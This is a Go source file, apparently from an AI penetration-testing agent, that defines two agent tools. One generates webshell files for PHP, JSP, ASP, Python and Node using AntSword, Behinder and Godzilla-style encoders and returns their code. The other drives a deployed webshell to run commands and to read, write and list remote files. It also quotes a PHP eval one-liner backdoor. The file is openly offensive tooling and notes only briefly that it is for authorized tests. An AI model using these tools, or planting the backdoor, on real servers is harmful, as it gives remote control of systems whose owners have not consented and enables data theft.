package agent

// tools_webshell.go — webshell 生成与连接工具（移植自 AI-PENTEST webshell 模块）。
// webshell_gen：按 语言×编码器 生成服务端 shell 文件（蚁剑 raw / 冰蝎 aes / 哥斯拉 xor / 一句话 form-cmd）。
// webshell_exec：对已部署的 shell 发加密请求执行命令/文件操作，__WS_*__ 标记协议解析。

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/Autumn-27/artex/webshell"
	actool "github.com/Autumn-27/norma/tool"
)

// wsWorkDir webshell 文件落盘目录（优先任务 droidDir，缺省系统临时目录）。
func (t *ToolSet) wsWorkDir() string {
	if t.droidDir != "" {
		return filepath.Join(t.droidDir, "webshells")
	}
	return filepath.Join(os.TempDir(), "forang-webshells")
}

func (t *ToolSet) webshellGen() actool.CoreTool {
	return writeTool("webshell_gen",
		"生成 webshell 服务端文件。组合：语言 php/jsp/jspx/py/node 支持 raw(蚁剑)/aes(冰蝎3.0)/xor(哥斯拉)；asp/aspx 仅 raw。form-cmd 编码器不生成文件（配合一句话 `<?php eval($_POST['cmd']); ?>` 使用）。文件落盘到任务工作目录 webshells/ 下，同时返回完整代码供落地。",
		obj(map[string]any{
			"script_type": str("脚本语言：php / jsp / jspx / asp / aspx / py / node"),
			"encoder":     str("编码器：raw / aes / xor（asp/aspx 仅 raw）"),
			"password":    str("连接密码（aes/xor 用其 md5 派生密钥）"),
			"filename":    str("可选：输出文件名，缺省 shell.<扩展名>"),
		}, "script_type", "encoder", "password"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				ScriptType string `json:"script_type"`
				Encoder    string `json:"encoder"`
				Password   string `json:"password"`
				Filename   string `json:"filename"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			if strings.TrimSpace(a.Password) == "" {
				return actool.Errorf("password 必填"), nil
			}
			code, err := webshell.GenerateShell(a.ScriptType, a.Encoder, a.Password)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			name := a.Filename
			if strings.TrimSpace(name) == "" {
				name = "shell." + webshell.FileExt(a.ScriptType)
			}
			name = filepath.Base(name) // 防路径穿越
			dir := t.wsWorkDir()
			if err := os.MkdirAll(dir, 0o700); err != nil {
				return actool.Errorf("创建输出目录失败: " + err.Error()), nil
			}
			p := filepath.Join(dir, name)
			if err := os.WriteFile(p, []byte(code), 0o600); err != nil {
				return actool.Errorf("写文件失败: " + err.Error()), nil
			}
			return actool.Text(fmt.Sprintf("✅ webshell 已生成：%s（%s/%s，%d 字节）\n连接参数：url=<部署地址> password=%q encoder=%s script_type=%s\n部署后用 webshell_exec 验证（先 op=test）。\n---- 文件内容 ----\n%s",
				p, a.ScriptType, a.Encoder, len(code), a.Password, a.Encoder, a.ScriptType, code)), nil
		})
}

func (t *ToolSet) webshellExec() actool.CoreTool {
	return writeTool("webshell_exec",
		"连接已部署的 webshell 执行操作。op：exec(默认，执行命令)/test(连通性探测)/list(列目录)/read(读文件)/write(写文件)。自动按 encoder 加密（raw=蚁剑/aes=冰蝎/xor=哥斯拉/form-cmd=一句话），响应按 __WS_*__ 标记解析出输出与 cwd。授权测试场景专用。",
		obj(map[string]any{
			"url":        str("webshell 完整 URL"),
			"password":   str("连接密码（form-cmd 时可用 'field:xxx' 指定字段名，默认 cmd）"),
			"encoder":    str("编码器：raw / aes / xor / form-cmd，默认 raw"),
			"script_type": str("脚本语言：php / jsp / jspx / asp / aspx / py / node，默认 php"),
			"op":         str("操作：test / exec / list / read / write，默认 exec"),
			"cmd":        str("op=exec 时的命令"),
			"path":       str("op=list/read/write 的目标路径"),
			"content":    str("op=write 的文本内容（二进制用 content_b64）"),
			"content_b64": str("op=write 写二进制时的 base64 数据"),
			"cwd":        str("可选：exec 的工作目录（shell 端 chdir）"),
			"timeout":    intp("可选：HTTP 超时秒数，默认 30"),
		}, "url", "password"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				URL        string `json:"url"`
				Password   string `json:"password"`
				Encoder    string `json:"encoder"`
				ScriptType string `json:"script_type"`
				Op         string `json:"op"`
				Cmd        string `json:"cmd"`
				Path       string `json:"path"`
				Content    string `json:"content"`
				ContentB64 string `json:"content_b64"`
				Cwd        string `json:"cwd"`
				Timeout    int    `json:"timeout"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			if strings.TrimSpace(a.URL) == "" || strings.TrimSpace(a.Password) == "" {
				return actool.Errorf("url 与 password 必填"), nil
			}
			if a.Encoder == "" {
				a.Encoder = "raw"
			}
			if a.ScriptType == "" {
				a.ScriptType = "php"
			}
			if a.Op == "" {
				a.Op = "exec"
			}
			cli := &webshell.Client{
				URL: a.URL, Password: a.Password, Encoder: a.Encoder, ScriptType: a.ScriptType,
				Cwd: a.Cwd, Timeout: time.Duration(a.Timeout) * time.Second,
			}
			if a.Timeout <= 0 {
				cli.Timeout = 30 * time.Second
			}
			params := webshell.P{Cmd: a.Cmd, Cwd: a.Cwd, Path: a.Path, Content: a.Content, B64Data: a.ContentB64}
			res, err := cli.RoundTrip(a.Op, params)
			if err != nil {
				return actool.Errorf("webshell 调用失败: " + err.Error()), nil
			}
			var b strings.Builder
			if !res.OK {
				fmt.Fprintf(&b, "❌ op=%s 失败：%s", a.Op, res.Error)
				return actool.Text(b.String()), nil
			}
			switch a.Op {
			case "test":
				fmt.Fprintf(&b, "✅ shell 存活（PONG nonce=%s）", res.Output)
			case "exec":
				out := res.Output
				if len(out) > 8000 {
					out = out[:8000] + "\n...(截断，共 " + fmt.Sprint(len(res.Output)) + " 字符)"
				}
				b.WriteString("✅ 命令输出：\n" + out)
				if res.CWD != "" {
					b.WriteString("\n[cwd] " + res.CWD)
				}
			case "list":
				b.WriteString("✅ 目录列表（JSON，字段 name/size/is_dir/mtime）：\n" + strings.TrimSpace(res.Output))
			case "read":
				saved := ""
				if a.Path != "" {
					local := filepath.Join(t.wsWorkDir(), "download_"+filepath.Base(strings.ReplaceAll(a.Path, "\\", "/")))
					if err := os.MkdirAll(t.wsWorkDir(), 0o700); err == nil {
						if err := os.WriteFile(local, res.Data, 0o600); err == nil {
							saved = "（已存本地：" + local + "）"
						}
					}
				}
				preview := res.Data
				if len(preview) > 2000 {
					preview = preview[:2000]
				}
				if isTexty(preview) {
					fmt.Fprintf(&b, "✅ 读取 %d 字节%s：\n%s", len(res.Data), saved, string(preview))
				} else {
					fmt.Fprintf(&b, "✅ 读取 %d 字节（二进制）%s", len(res.Data), saved)
				}
			case "write":
				b.WriteString("✅ 写入成功：" + a.Path)
			default:
				b.WriteString("✅ 完成：" + strings.TrimSpace(res.Output))
			}
			return actool.Text(b.String()), nil
		})
}

// isTexty 粗判字节是否为可打印文本（供 read 预览）。
func isTexty(b []byte) bool {
	n := 0
	for _, c := range b {
		if c == '\n' || c == '\r' || c == '\t' || (c >= 0x20 && c < 0x7f) || c >= 0x80 {
			n++
		}
	}
	return len(b) == 0 || n*10 >= len(b)*9
}
